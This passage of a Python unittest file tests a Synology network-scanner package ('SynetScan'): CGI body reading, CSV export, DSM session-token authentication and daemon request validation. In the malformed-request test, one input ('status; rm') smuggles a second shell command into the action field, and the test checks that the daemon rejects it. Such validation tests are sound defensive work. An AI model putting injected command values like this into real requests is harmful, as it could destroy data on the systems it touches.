    def test_the_body_is_read_from_a_real_pipe_and_never_waited_for_forever(self):
        lib = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src", "lib")
        code = ("import sys; sys.path.insert(0, %r); from synetscan import cgi_main; cgi_main.BODY_TIMEOUT = 0.6; "
                "b = cgi_main.read_body(); print(len(b), sys.stdin.buffer.read() if b'end' in b else b'')" % lib)
        for body, announced, close in ((b"x" * 200000 + b"end", 200003, True), (b'{"a": 1}', 5000, False)):
            proc = subprocess.Popen([sys.executable, "-I", "-c", code], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    env={"CONTENT_LENGTH": str(announced), "PATH": os.environ.get("PATH", "")})
            start = time.monotonic()
            proc.stdin.write(body)
            proc.stdin.flush()
            if close:
                proc.stdin.close()
            out = proc.stdout.read()
            proc.stdout.close()
            proc.wait(10)
            if not close:
                proc.stdin.close()
            self.assertEqual(out.split()[0], str(len(body)).encode(), out)
            self.assertLess(time.monotonic() - start, 5)

    def test_csv_download(self):
        head, payload, _ = self.call("export&format=csv")
        self.assertIn('Content-Disposition: attachment; filename="synetscan-devices.csv"', head)
        self.assertIn("Content-Type: text/csv", head)

    def test_session_token_only_from_the_header_and_no_switch_around_dsm(self):
        seen = []

        def run(argv, env=None, **kw):
            seen.append((argv, env["QUERY_STRING"]))
            return mock.Mock(stdout=b"alice\n", returncode=0)

        environ = {"QUERY_STRING": "action=status&SynoToken=from-url", "HTTP_X_SYNO_TOKEN": "from header",
                   "SYNETSCAN_DEV": "1", "SYNETSCAN_VAR": "/tmp/elsewhere"}
        with mock.patch.dict(os.environ, environ, clear=True), mock.patch.object(cgi_main.os, "access", lambda *a: True), \
                mock.patch.object(cgi_main.subprocess, "run", run):
            self.assertEqual(cgi_main.authenticate(), "alice")
            del os.environ["HTTP_X_SYNO_TOKEN"]
            cgi_main.authenticate()
        self.assertEqual(seen, [([cgi_main.AUTH_CGI], "SynoToken=from%20header"), ([cgi_main.AUTH_CGI], "")])
        # without DSM's authenticate.cgi nobody is logged in, whatever the environment says
        with mock.patch.dict(os.environ, environ, clear=True), mock.patch.object(cgi_main.os, "access", lambda *a: False):
            self.assertIsNone(cgi_main.authenticate())
            self.assertFalse(cgi_main.is_admin("mallory"))
        self.assertEqual(cgi_main.VAR_DIR, "/var/packages/SynetScan/var")


class SocketTests(unittest.TestCase):
    def test_what_the_cgi_accepts_also_fits_through_the_socket(self):
        # a body near the limit full of umlauts, and a lone surrogate that JSON allows
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        srv = daemon._Server(daemon.socket_path(d), daemon._Handler)
        srv.service = daemon.Service(d)
        threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.1}, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        notes = "ä" * (daemon.MAX_REQUEST // 2 - 200)
        self.assertEqual(daemon.request(d, "no_such_thing", {"notes": notes})["error"]["code"], "unknown_action")
        self.assertEqual(daemon.request(d, "no_such_thing", json.loads('{"x": "\\ud800"}'))["error"]["code"], "unknown_action")


class ServiceTests(unittest.TestCase):
    def test_odd_requests_do_not_reach_anything(self):
        svc = daemon.Service(tempfile.mkdtemp())
        for req in ([], "x", None, {}, {"action": 5}, {"action": ["status"]}, {"action": "__init__"},
                    {"action": "store"}, {"action": "status; rm"}, {"action": "STATUS"}, {"action": "a" * 100}):
            with self.assertRaises(daemon.ApiError):
                svc.handle(req)
        self.assertEqual(svc.handle({"action": "status", "params": [1, 2], "user": "a\nb"})["status"], "idle")
        self.assertEqual(svc.handle({"action": "device_delete", "params": {"ids": "all"}}), {"deleted": 0})
        self.assertEqual(svc.handle({"action": "device_delete", "params": {"ids": [["x"], {"y": 1}, 3]}}), {"deleted": 0})
        self.assertEqual(svc.handle({"action": "device_known", "params": {"ids": [None]}}), {})
        for action in ("device_update", "wake"):
            with self.assertRaises(daemon.ApiError) as cm:
                svc.handle({"action": action, "params": {"id": ["x"]}})
            self.assertEqual(cm.exception.code, "not_found")
        with self.assertRaises(daemon.ApiError) as cm:
            svc.handle({"action": "config_set", "params": {"config": {"ports": "0"}}})
        self.assertEqual(cm.exception.code, "invalid_config")


if __name__ == "__main__":
    unittest.main()
